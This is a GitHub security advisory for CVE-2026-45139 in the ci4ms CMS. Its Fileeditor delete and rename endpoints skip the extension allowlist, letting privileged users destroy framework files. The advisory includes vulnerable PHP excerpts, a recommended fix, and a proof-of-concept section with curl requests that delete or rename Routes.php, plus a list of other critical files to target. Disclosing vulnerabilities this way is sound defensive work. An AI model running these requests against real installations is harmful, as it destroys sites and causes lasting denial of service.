# [M] CI4MS Fileeditor allows deletion and rename of critical application files due to missing extension allowlist on destructive operations

## Summary
Severity: Medium
Advisory: GHSA-245j-xjvr-xvm5
CVE: CVE-2026-45139
CWE: CWE-73
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-245j-xjvr-xvm5
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.9.0

## Details
## Summary

The Fileeditor module enforces an extension allowlist (`['css','js','html','txt','json','sql','md']`) on content-write operations (`saveFile`, `createFile`), but two destructive endpoints — `deleteFileOrFolder` and `renameFile` — never validate the extension of the *source* path. A backend user with file-editor permissions can therefore unlink or rename any file inside the project root that is not explicitly listed in the small `$hiddenItems` blocklist. Critical framework files such as `app/Config/Routes.php`, `app/Config/App.php`, `app/Config/Database.php`, `app/Config/Filters.php`, `public/index.php`, and `public/.htaccess` all live outside that blocklist and can be destroyed, producing a persistent denial of service that requires filesystem-level redeployment to recover.

## Details

Root cause: inconsistent application of the extension allowlist across Fileeditor operations in `modules/Fileeditor/Controllers/Fileeditor.php`.

The class declares an allowlist used by content-write operations:

```php
// modules/Fileeditor/Controllers/Fileeditor.php:9
protected $allowedExtensions = ['css', 'js', 'html', 'txt', 'json', 'sql', 'md'];

// line 239
private function allowedFileTypes(string $file): bool
{
    $extension = pathinfo($file, PATHINFO_EXTENSION);
    if (!in_array(strtolower($extension), $this->allowedExtensions)) {
        return false;
    }
    return true;
}
```

`saveFile` (line 110) and `createFile` (line 167) correctly call `allowedFileTypes()` against the target path before writing. The two destructive endpoints do not:

```php
// deleteFileOrFolder — modules/Fileeditor/Controllers/Fileeditor.php:210-237
public function deleteFileOrFolder()
{
    $valData = ([
        'path' => ['label' => '', 'rules' => 'required|max_length[255]|regex_match[/^[a-zA-Z0-9_ \-\.\/]+$/]'],
    ]);
    if ($this->validate($valData) == false) return $this->fail($this->validator->getErrors());
    $path = $this->request->getVar('path');
    if ($this->isHiddenPath($path)) {
        return $this->failForbidden();
    }
    $fullPath = realpath(ROOTPATH . $path);

    if (!$fullPath || strpos($fullPath, realpath(ROOTPATH)) !== 0) {
        return $this->response->setJSON(['error' => lang('Fileeditor.invalidFileOrFolder')])->setStatusCode(400);
    }

    if (is_dir($fullPath)) {
        $result = rmdir($fullPath);
    } else {
        $result = unlink($fullPath);   // executes on ANY extension
    }
    ...
}
```

```php
// renameFile — modules/Fileeditor/Controllers/Fileeditor.php:123-151
public function renameFile()
{
    ...
    $path = $this->request->getVar('path');
    if ($this->isHiddenPath($path)) {
        return $this->failForbidden();
    }
    $newName = $this->request->getVar('newName');
    $fullPath = realpath(ROOTPATH . $path);
    $newPath = dirname($fullPath) . DIRECTORY_SEPARATOR . $newName;

    if (!$this->allowedFileTypes($newName))   // <— only the destination is checked
        return $this->failForbidden();
    ...
    if (rename($fullPath, $newPath)) { ... }   // source extension never validated
}
```

The validation gauntlet a path traverses before reaching `unlink()`/`rename()`:

1. **Regex** `/^[a-zA-Z0-9_ \-\.\/]+$/` — admits any path made of alphanumerics, dots, dashes, underscores, slashes (matches `app/Config/Routes.php` trivially).
2. **`isHiddenPath()`** — only blocks paths whose individual segments equal an entry in `$hiddenItems`:

```php
// modules/Fileeditor/Controllers/Fileeditor.php:10-26
protected $hiddenItems = [
    '.git', '.github', '.idea', '.vscode', 'node_modules', 'vendor',
    'writable', '.env', 'env', 'composer.json', 'composer.lock',
    'tests', 'spark', 'phpunit.xml.dist', 'preload.php'
];
```

   Critical CodeIgniter 4 framework files (`app`, `Config`, `Routes.php`, `App.php`, `Database.php`, `Filters.php`, `public`, `index.php`, `.htaccess`) are **not** members of this list, so they pass.

3. **`realpath` + `strpos` containment** — confirms the resolved path is inside `ROOTPATH`. Routes.php, etc., are inside ROOTPATH and pass.

4. **Sink** — `unlink()` or `rename()` runs unconditionally; no extension allowlist applied.

The recent security patch in commit `379ebb6` ("Security: patch critical vulnerabilities and bump to v0.31.4.0") added `isHiddenPath()` invocations to every endpoint, addressing the previous `.env` reachability. It did **not** address the missing extension allowlist on delete and rename source paths. The inconsistency therefore survives in HEAD (v0.31.8.0).

Authorization is provided by the `backendGuard` filter (`modules/Fileeditor/Config/FileeditorConfig.php:12-17`) routing through `Modules\Auth\Filters\Ci4MsAuthFilter`, which requires the role permission `fileeditor.delete` for `deleteFileOrFolder` and `fileeditor.update` for `renameFile`. Superadmins always pass; role-assigned users with only the Fileeditor permission can also reach the sink, exceeding the editor's apparent design intent (the allowlist on save/create signals that the editor is meant to handle only safe content-type files).

## PoC

Prerequisites: an authenticated session with `fileeditor.delete` (or `superadmin`) for step 1, and `fileeditor.update` for step 2. The application is mounted under `backend/`, not `admin/`.

```bash
# 1) Arbitrary file deletion (no extension check at all)
curl -X POST 'https://target/backend/fileeditor/deleteFileOrFolder' \
  -H 'Cookie: ci_session=<admin>' \
  --data-urlencode 'path=app/Config/Routes.php'
# -> {"success": true}
# Routes.php is unlinked. The next request fails because no routes load. Persistent DoS.

# Equivalently catastrophic targets (none of these segments are in $hiddenItems):
#   path=public/index.php           (front controller — entire app dead)
#   path=app/Config/App.php         (core app config)
#   path=app/Config/Database.php    (DB config)
#   path=app/Config/Filters.php     (auth/CSRF filters)
#   path=public/.htaccess           (rewrite + security rules)

# 2) Rename .php to neutralize the file without checking the source extension
curl -X POST 'https://target/backend/fileeditor/renameFile' \
  -H 'Cookie: ci_session=<admin>' \
  --data-urlencode 'path=app/Config/Routes.php' \
  --data-urlencode 'newName=Routes.txt'
# -> {"success": true}
# Routes.php disappears, becomes Routes.txt. Routing dies on next request.
```

Trace verifying the validation logic for `path=app/Config/Routes.php`:

- Regex `/^[a-zA-Z0-9_ \-\.\/]+$/` — matches.
- `isHiddenPath('app/Config/Routes.php')` — segments `['app','Config','Routes.php']`, none in `$hiddenItems` → returns `false`.
- `realpath(ROOTPATH . 'app/Config/Routes.php')` — resolves inside ROOTPATH, containment check passes.
- `unlink($fullPath)` (deleteFileOrFolder, line 229) or `rename($fullPath, $newPath)` (renameFile, line 146) executes — no extension allowlist applied.

## Impact

A backend user holding the Fileeditor `delete` or `update` permission can:

- Delete or neutralize the front controller (`public/index.php`), routing config (`app/Config/Routes.php`), database config (`app/Config/Database.php`), filter pipeline (`app/Config/Filters.php`), web-server rules (`public/.htaccess`), or any other framework file inside the project root.
- Cause persistent denial of service: the application becomes unreachable on the next request and there is no in-app "restore" — recovery requires filesystem access (redeploy, git checkout, or backup restore).
- Destroy data files inside the project tree (e.g. SQLite databases, cached config) outside the small `$hiddenItems` blocklist.

The destructive surface exceeds Fileeditor's intended capability: the saveFile/createFile allowlist signals an explicit design intent to restrict modifications to safe content extensions, yet delete/rename can target arbitrary file types. Even where the actor is already a superadmin, the bug widens the destructive blast radius beyond what the editor UI exposes and beyond what `fileeditor.delete` plausibly authorizes for non-superadmin role holders.

The path is gated by an admin-tier permission, so PR:H is honest; impact is limited to integrity/availability of files reachable by the web server user.

## Recommended Fix

Apply the same `allowedFileTypes()` allowlist (or a stricter directory allowlist for editor-managed assets) to the source path in both destructive endpoints. After the existing `realpath` containment check:

```php
// In deleteFileOrFolder, after line 224:
if (!is_dir($fullPath) && !$this->allowedFileTypes($fullPath)) {
    return $this->failForbidden();
}

// In renameFile, alongside the existing $newName check at line 139:
if (!$this->allowedFileTypes($fullPath) || !$this->allowedFileTypes($newName)) {
    return $this->failForbidden();
}
```

Stronger hardening — and aligned with the editor's apparent intent — is to confine all Fileeditor operations to a directory allowlist (e.g. `public/templates/`, `public/uploads/`) rather than the entire `ROOTPATH`, and to extend `$hiddenItems` (or replace it with a denylist of full path prefixes) so that `app/Config`, `public/index.php`, `public/.htaccess`, and similar framework artefacts cannot be reached even by symlink or alternate casing.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-245j-xjvr-xvm5
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.9.0
